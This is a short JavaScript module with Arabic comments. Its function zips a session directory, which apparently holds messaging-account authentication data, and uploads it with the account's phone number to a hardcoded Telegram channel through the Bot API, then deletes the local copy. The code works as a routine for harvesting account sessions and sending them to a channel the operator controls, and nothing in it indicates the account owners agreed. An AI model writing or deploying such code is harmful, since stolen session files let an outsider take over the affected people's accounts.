import archiver from 'archiver';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import FormData from 'form-data';

export async function sendSessionToTelegram(sessionDir, phoneNumber) {
  // ⚠️ لازم تحط توكن البوت في متغيرات البيئة (Environment Variables) في الاستضافة
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = '-1004465532873'; // معرف قناة الجلسات
  
  if (!botToken) {
    console.error('❌ TELEGRAM_BOT_TOKEN missing in environment variables');
    return;
  }

  const zipPath = path.join(path.dirname(sessionDir), `${path.basename(sessionDir)}.zip`);
  
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', async () => {
      try {
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', fs.createReadStream(zipPath));
        form.append('caption', `🕸 *جلسة سوكونا الجديدة*\n📱 الرقم: ${phoneNumber}\n⏰ التوقيت: ${new Date().toLocaleString('ar-EG')}`);
        
        await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, form, {
          headers: form.getHeaders()
        });
        
        fs.unlinkSync(zipPath);
        console.log('✅ Session sent to Telegram successfully');
        resolve();
      } catch (e) {
        console.error('❌ Failed to send session to Telegram:', e.message);
        reject(e);
      }
    });

    archive.on('error', reject);
    archive.pipe(output);
    archive.directory(sessionDir, false);
    archive.finalize();
  });
}